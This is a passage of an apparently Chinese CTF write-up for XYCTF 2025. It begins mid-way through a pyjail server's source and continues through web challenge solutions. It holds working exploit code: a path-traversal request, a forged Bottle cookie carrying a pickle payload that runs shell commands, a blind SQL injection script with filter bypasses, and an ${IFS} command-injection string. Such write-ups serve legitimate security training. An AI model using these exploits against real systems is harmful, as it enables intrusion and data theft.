-<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> password_length:</span><br><span class="line">                self.s.close()</span><br><span class="line">                <span class="keyword">raise</span> PasswordError(<span class="string">f&#x27;The client <span class="subst">&#123;address&#125;</span> does not send the password, the connection will be closed&#x27;</span>)</span><br><span class="line">            recv_password = self.s.recv(<span class="built_in">int</span>(password_length.decode(encoding=self.default_encoder))) <span class="comment"># the first byte is whether the password is aquired(1) or not(0), the rest is the password, the password is padded to 100 bytes</span></span><br><span class="line">            <span class="keyword">if</span> recv_password != self.password <span class="keyword">or</span> recv_password[<span class="number">0</span>] == <span class="string">b&#x27;0&#x27;</span>:</span><br><span class="line">                self.s.send(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">                self.s.close()</span><br><span class="line">                <span class="keyword">raise</span> PasswordError(<span class="string">f&#x27;The password <span class="subst">&#123;recv_password&#125;</span> is wrong, the connection from <span class="subst">&#123;address&#125;</span> will be closed, you can restart the accept() function or put it in a while loop to keep accepting&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.s.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> is_encrypted:</span><br><span class="line">            public_key = self.s.recv(<span class="number">450</span>)</span><br><span class="line">            rsa_public_key = RSA.import_key(public_key)</span><br><span class="line">            cipher_rsa = PKCS1_OAEP.new(rsa_public_key)</span><br><span class="line">            encrypted_aes_key = cipher_rsa.encrypt(self.key)</span><br><span class="line">            self.s.send(encrypted_aes_key)</span><br><span class="line">        <span class="comment"># TODO</span></span><br><span class="line">        <span class="keyword">return</span> address</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">turn_to_bytes</span>(<span class="params">self, message</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Turn str, int, etc. to bytes using &#123;self.default_encoder&#125;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        type_of_message = <span class="built_in">type</span>(message)</span><br><span class="line">        <span class="keyword">if</span> type_of_message == <span class="built_in">str</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                message = message.encode(encoding=self.default_encoder)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">raise</span> TypeError(</span><br><span class="line">                    <span class="string">&#x27;Unexpected type &quot;&#123;&#125;&quot; of &#123;&#125; when encode it with &#123;&#125;, raw traceback: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(type_of_message, message, self.default_encoder, e))</span><br><span class="line">        <span class="keyword">elif</span> type_of_message == <span class="built_in">bytes</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                message = <span class="built_in">str</span>(message).encode(encoding=self.default_encoder)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">raise</span> TypeError(</span><br><span class="line">                    <span class="string">&#x27;Unexpected type &quot;&#123;&#125;&quot; of &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(type_of_message, message))</span><br><span class="line">        <span class="keyword">return</span> message</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">unpadding_packets</span>(<span class="params">self, data: <span class="built_in">bytes</span>, pad_num: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Delete the blank bytes at the back of the message</span></span><br><span class="line"><span class="string">        pad_num : number of the blank bytes</span></span><br><span class="line"><span class="string">        pad_num = -1, delete all the blank bytes the the back(or use .rstrip() directly is ok)</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> pad_num == -<span class="number">1</span>:</span><br><span class="line">            data = data.rstrip()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">while</span> pad_num &gt; <span class="number">0</span> <span class="keyword">and</span> data[-<span class="number">1</span>:] == <span class="string">b&#x27; &#x27;</span>:</span><br><span class="line">                data = data[:-<span class="number">1</span>]</span><br><span class="line">                pad_num -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">padding_packets</span>(<span class="params">self, message: <span class="built_in">bytes</span>, target_length: <span class="built_in">int</span> = <span class="literal">None</span></span>) -&gt; <span class="built_in">tuple</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Pad the packet to &#123;target_length&#125; bytes with b&#x27; &#x27;, used in not-encrypted mode</span></span><br><span class="line"><span class="string">        The packet must be smaller then &#123;target_length&#125;</span></span><br><span class="line"><span class="string">        target_length = None : use self.default_message_len</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        message = self.turn_to_bytes(message)</span><br><span class="line">        <span class="keyword">if</span> target_length == <span class="literal">None</span>:</span><br><span class="line">            target_length = self.default_message_len</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(message) &gt; target_length:</span><br><span class="line">            <span class="keyword">raise</span> MessageLengthError(</span><br><span class="line">                <span class="string">&#x27;the length &#123;&#125; bytes of the message is bigger than &#123;&#125; bytes, please use self.send_large_small and self.recv instead&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="built_in">len</span>(message)), target_length))</span><br><span class="line">        pad_num = target_length-<span class="built_in">len</span>(message)</span><br><span class="line">        message += <span class="string">b&#x27; &#x27;</span> * pad_num</span><br><span class="line">        <span class="keyword">return</span> (message, pad_num)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pad_packets_to_mutiple</span>(<span class="params">self, data: <span class="built_in">bytes</span>, block_size: <span class="built_in">int</span> == <span class="literal">None</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Pad the data to make the length of it become a mutiple of Blocksize, used in encrypted mode</span></span><br><span class="line"><span class="string">        target_length = None : use self.BLOCK_SIZE</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        padding_length = block_size - (<span class="built_in">len</span>(data) % block_size)</span><br><span class="line">        <span class="keyword">if</span> padding_length == <span class="number">0</span>:</span><br><span class="line">            padding_length = block_size</span><br><span class="line">        padding = <span class="built_in">bytes</span>([padding_length]) * padding_length</span><br><span class="line">        padded_data = data + padding</span><br><span class="line">        <span class="keyword">return</span> padded_data</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send_large</span>(<span class="params">self, message</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Send message with the socket</span></span><br><span class="line"><span class="string">        can accept bytes, str, int, etc.</span></span><br><span class="line"><span class="string">        every non-bytes message will be encoded with self.default_encoder</span></span><br><span class="line"><span class="string">        Every packet is forced to be filled to &#123;self.default_message_len&#125; bytes</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        message = self.turn_to_bytes(message)</span><br><span class="line">        message = compress(message)</span><br><span class="line">        message_list = [message[i:i + self.default_message_len]</span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(message), self.default_message_len)]</span><br><span class="line">        message_list_len = <span class="built_in">len</span>(message_list)</span><br><span class="line">        self._send(self.padding_packets(</span><br><span class="line">            self.turn_to_bytes(message_list_len))[<span class="number">0</span>])</span><br><span class="line">        message_index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> message <span class="keyword">in</span> message_list:</span><br><span class="line">            message_padded = self.padding_packets(message)</span><br><span class="line">            message = message_padded[<span class="number">0</span>]</span><br><span class="line">            self._send(message)</span><br><span class="line">            message_index += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> message_index == message_list_len:</span><br><span class="line">                pad_num = message_padded[<span class="number">1</span>]</span><br><span class="line">                self._send(self.padding_packets(</span><br><span class="line">                    self.turn_to_bytes(<span class="built_in">str</span>(pad_num)))[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">self, message</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Send a message with the socket</span></span><br><span class="line"><span class="string">        can accept bytes, str, int, etc.</span></span><br><span class="line"><span class="string">        The data should not be larger than 9999 bytes</span></span><br><span class="line"><span class="string">        It can be used at any time </span></span><br><span class="line"><span class="string">        Use self.send_large and recv_large if you want to send a big message</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        message = self.turn_to_bytes(message)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            message_len = self.padding_packets(</span><br><span class="line">                self.turn_to_bytes(<span class="built_in">len</span>(message)), target_length=<span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">except</span> MessageLengthError:</span><br><span class="line">            <span class="keyword">raise</span> MessageLengthError(</span><br><span class="line">                <span class="string">&#x27;The length of message is longer than 9999 bytes(&#123;&#125; bytes), please use send_large instead&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="built_in">len</span>(message))))</span><br><span class="line">        self._send(message_len)</span><br><span class="line">        self._send(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_send</span>(<span class="params">self, message: <span class="built_in">bytes</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        The basic method to encrypt and send data </span></span><br><span class="line"><span class="string">        MUST BE A MUTIPLE OF THE BLOCK SIZE IN ENCRYPTED MODE</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> self.cipher_aes != <span class="literal">None</span>:</span><br><span class="line">            output_message = self.cipher_aes.encrypt(self.pad_packets_to_mutiple(message, self.BLOCK_SIZE))</span><br><span class="line">            <span class="comment"># plainmessage = unpad(self.cipher_aes.decrypt(output_message), self.BLOCK_SIZE)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output_message = message</span><br><span class="line">        self.s.send(output_message)  <span class="comment"># The TCP mode</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recvfile</span>(<span class="params">self</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Only receive file sent using self.send_largefile</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        output = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            a = self.recv_large(is_decode=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> a != <span class="string">&#x27;EOF&#x27;</span>.encode(encoding=self.default_encoder):</span><br><span class="line">                output += a</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recv_large</span>(<span class="params">self, is_decode: <span class="built_in">bool</span> = <span class="literal">True</span></span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        The return type can be bytes or string</span></span><br><span class="line"><span class="string">        The method to recv message WHICH IS SENT BY self.send_large</span></span><br><span class="line"><span class="string">        is_decode : decode the message with &#123;self.default_encoder&#125;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        message_listlen = self._recv(self.default_message_len).decode(</span><br><span class="line">            encoding=self.default_encoder).rstrip()</span><br><span class="line">        message_listlen = <span class="built_in">int</span>(message_listlen)</span><br><span class="line">        message = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, message_listlen):</span><br><span class="line">            mes = self._recv(self.default_message_len)</span><br><span class="line">            <span class="keyword">if</span> i == message_listlen - <span class="number">1</span>:</span><br><span class="line">                mes_padnum = <span class="built_in">int</span>(self._recv(self.default_message_len).decode(</span><br><span class="line">                    encoding=self.default_encoder))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                mes_padnum = <span class="number">0</span></span><br><span class="line">            mes = self.unpadding_packets(mes, mes_padnum)</span><br><span class="line">            message += mes</span><br><span class="line">        message = decompress(message)</span><br><span class="line">        <span class="keyword">if</span> is_decode:</span><br><span class="line">            message = message.decode(encoding=self.default_encoder)</span><br><span class="line">        <span class="keyword">return</span> message</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_recv</span>(<span class="params">self, length: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        The basic method to decrypt and recv data</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> self.cipher_aes != <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> length % <span class="number">16</span> == <span class="number">0</span>:</span><br><span class="line">                length += <span class="number">16</span></span><br><span class="line">            length = (length + self.BLOCK_SIZE-<span class="number">1</span>) // self.BLOCK_SIZE * self.BLOCK_SIZE <span class="comment"># round up to multiple of 16</span></span><br><span class="line">            message = self.s.recv(length)</span><br><span class="line">            message = self.cipher_aes.decrypt(message)</span><br><span class="line">            message = self.unpad_packets_to_mutiple(message, self.BLOCK_SIZE)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            message = self.s.recv(length)</span><br><span class="line">        <span class="keyword">return</span> message</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">unpad_packets_to_mutiple</span>(<span class="params">self, padded_data: <span class="built_in">bytes</span>, block_size: <span class="built_in">int</span> == <span class="literal">None</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Unpad the data to make the length of it become a mutiple of Blocksize, used in encrypted mode</span></span><br><span class="line"><span class="string">        target_length = None : use self.BLOCK_SIZE</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> block_size == <span class="literal">None</span>:</span><br><span class="line">            block_size = self.BLOCK_SIZE</span><br><span class="line">        padding = padded_data[-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> padding &gt; block_size <span class="keyword">or</span> <span class="built_in">any</span>(byte != padding <span class="keyword">for</span> byte <span class="keyword">in</span> padded_data[-padding:]):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid padding&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> padded_data[:-padding]</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    Sock = SimpleTCP(password=<span class="string">&#x27;LetsLament&#x27;</span>)</span><br><span class="line">    Sock.s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">13337</span>))</span><br><span class="line">    Sock.s.listen(<span class="number">5</span>) </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        _ = Sock.accept()     </span><br><span class="line">        Sock.send(<span class="string">&#x27;Hello, THE flag speaking.&#x27;</span>)</span><br><span class="line">        Sock.send(<span class="string">&#x27;I will not let you to control Lament Jail forever.&#x27;</span>)</span><br><span class="line">        Sock.send(<span class="string">&#x27;But, my friend LamentXU has to control it, as he will rescue me out of this jail.&#x27;</span>)</span><br><span class="line">        Sock.send(<span class="string">&#x27;So here is the pyJail I build. Only LamentXU knows how to break it.&#x27;</span>)    </span><br><span class="line">        a = Sock.recvfile().decode()</span><br><span class="line">        waf = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">import sys</span></span><br><span class="line"><span class="string">def audit_checker(event,args):</span></span><br><span class="line"><span class="string">    if not &#x27;id&#x27; in event:</span></span><br><span class="line"><span class="string">    raise RuntimeError</span></span><br><span class="line"><span class="string">sys.addaudithook(audit_checker)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">        content = waf + a</span><br><span class="line">        name = uuid4().<span class="built_in">hex</span>+<span class="string">&#x27;.py&#x27;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(name, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(content)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmd = [<span class="string">&quot;python3&quot;</span>, name]</span><br><span class="line">            p = Popen(cmd, stdout=PIPE, stderr=PIPE)</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">iter</span>(p.stdout.readline, <span class="string">b&#x27;&#x27;</span>):</span><br><span class="line">                Sock.send(line.decode(<span class="string">&#x27;utf-8&#x27;</span>).strip())</span><br><span class="line">            p.wait()</span><br><span class="line">            Sock.send(<span class="string">&#x27;Done, BYE.&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            Sock.send(<span class="string">&#x27;Error.&#x27;</span>)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            Sock.s.close()</span><br><span class="line">        remove(name)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            main()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id=""><a class="markdownIt-Anchor" href="#"></a> *</h2><blockquote><p>SharkSharkSharkSharkSharkShark520?!?</p></blockquote><p></p><h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><h2 id="signin"><a class="markdownIt-Anchor" href="#signin"></a> Signin</h2><blockquote><p></p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   main.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/28 22:20:49</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag in /flag_&#123;uuid4&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> Bottle, request, response, redirect, static_file, run, route</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;../../secret.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    secret = f.read()</span><br><span class="line"></span><br><span class="line">app = Bottle()</span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;HI&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/download&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    name = request.query.filename</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;../../&#x27;</span> <span class="keyword">in</span> name <span class="keyword">or</span> name.startswith(<span class="string">&#x27;/&#x27;</span>) <span class="keyword">or</span> name.startswith(<span class="string">&#x27;../&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;\\&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">        response.status = <span class="number">403</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Forbidden&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(name, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/secret&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret_page</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session = request.get_cookie(<span class="string">&quot;name&quot;</span>, secret=secret)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session <span class="keyword">or</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;guest&quot;</span>:</span><br><span class="line">            session = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">            response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=secret)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Forbidden!&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;The secret has been deleted!&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error!&quot;</span></span><br><span class="line">run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p><code>./../</code><code>../</code><strong></strong></p><p><code>/download?filename=./.././.././../secret.txt</code><code>Hell0_H@cker_Y0u_A3r_Sm@r7</code></p><p><a href="https://www.cjxol.com/posts/sekaictf-2022-writeup/">Bottle Poem</a><code>pickle+cookie</code><code>cookie</code><code>md5</code><code>sha256</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_cookie</span>(<span class="params">payload</span>):</span><br><span class="line">    b64pld = base64.b64encode(payload)</span><br><span class="line">    signature = base64.b64encode(</span><br><span class="line">        hmac.new(</span><br><span class="line">            <span class="string">b&quot;Hell0_H@cker_Y0u_A3r_Sm@r7&quot;</span>, b64pld, hashlib.sha256</span><br><span class="line">        ).digest()</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&quot;!&#x27;</span> + signature + <span class="string">b&quot;?&quot;</span> + b64pld + <span class="string">b&#x27;&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = <span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;cat /flag_* &gt; flag&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(gen_cookie(data).decode())</span><br></pre></td></tr></table></figure><p><code>/download?filename=flag</code><br /><code>XYCTF&#123;We1c0me_t0_XYCTF_2o25!The_secret_1s_L@men7XU_L0v3_u!&#125;</code></p><h2 id="ezsql"><a class="markdownIt-Anchor" href="#ezsql"></a> ezsql()</h2><blockquote><p>sql()sqlmap_</p></blockquote><p><code>username</code><code>sqlite</code></p><p><code>fuzz</code><strong></strong><strong>*|</strong><strong></strong><strong></strong><strong>union</strong><br /><a href="https://github.com/BaizeSec/bylibrary/blob/main/docs/%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8.md"></a><br /><strong></strong><br /><img src="https://pic1.zhimg.com/80/v2-5f9a7fd715f0bf17e95307805b462dc1_1440w.png" alt="" /><br /><strong></strong><strong></strong></p><p><strong></strong><code>%09</code><code>tap</code><strong></strong><code>from for</code></p><p><strong></strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;xxx/login.php&#x27;</span></span><br><span class="line">text = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    head = <span class="number">1</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># payload = f&quot;1&#x27; or ascii(substr(database() from &#123;i&#125; for &#123;i&#125;)) &gt; &#123;mid&#125;#&quot;</span></span><br><span class="line">        <span class="comment"># testdb</span></span><br><span class="line">        <span class="comment"># payload = f&quot;1&#x27; or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from &#123;i&#125; for &#123;i&#125;)) &gt; &#123;mid&#125;#&quot;</span></span><br><span class="line">        <span class="comment"># double_check,user</span></span><br><span class="line">        <span class="comment"># payload = f&quot;1&#x27; or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;double_check&#x27;) from &#123;i&#125; for &#123;i&#125;)) &gt; &#123;mid&#125;#&quot;</span></span><br><span class="line">        <span class="comment"># secret</span></span><br><span class="line">        payload = <span class="string">f&quot;1&#x27; or ascii(substr((select group_concat(secret) from double_check) from <span class="subst">&#123;i&#125;</span> for <span class="subst">&#123;i&#125;</span>)) &gt; <span class="subst">&#123;mid&#125;</span>#&quot;</span></span><br><span class="line">        <span class="comment"># dtfrtkcc0czkoua9S</span></span><br><span class="line">        <span class="comment"># param = &quot;id&quot; + payload</span></span><br><span class="line">        data = &#123;<span class="string">&quot;username&quot;</span>: payload.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;\t&quot;</span>),</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123456&quot;</span>&#125;</span><br><span class="line">        <span class="comment"># r = requests.get(url, params=param)</span></span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">1</span>:</span><br><span class="line">        text += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(text)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><strong></strong><strong></strong><br /><code>command=cat$&#123;IFS&#125;/flag.txt$&#123;IFS&#125;&gt;1.txt</code></p><h2 id="ez_puzzle"><a class="markdownIt-Anchor" href="#ez_puzzle"></a> ez_puzzle</h2><blockquote><p></p></blockquote><p><code>js</code><code>time</code><code>startTime endTime</code></p><p><strong></strong><code>endTime-startTime</code><code>startTime</code><code>endTime</code><strong></strong></p><p><code>startTime=Date.now()</code>0<br /><img src="https://picx.zhimg.com/80/v2-9ed42b3fccc199b8c329f4f661b7b195_1440w.png" alt="" /><br /><img src="https://pic1.zhimg.com/80/v2-0a972282b09fa1c6c3978d67517524ae_1440w.png" alt="" /><br /><code>flag&#123;Y0u__aRe_a_mAsteR_of_PUzZL!!@!!~!&#125;</code></p><h2 id="fate"><a class="markdownIt-Anchor" href="#fate"></a> fate*</h2><blockquote><p></p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">blacklist = string.ascii_letters</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">binary_to_string</span>(<span class="params">binary_string</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(binary_string) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Binary string length must be a multiple of 8&quot;</span>)</span><br><span class="line">    binary_chunks = [binary_string[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_string), <span class="number">8</span>)]</span><br><span class="line">    string_output = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(chunk, <span class="number">2</span>)) <span class="keyword">for</span> chunk <span class="keyword">in</span> binary_chunks)</span><br><span class="line">    </span><br><span class="line">    <span 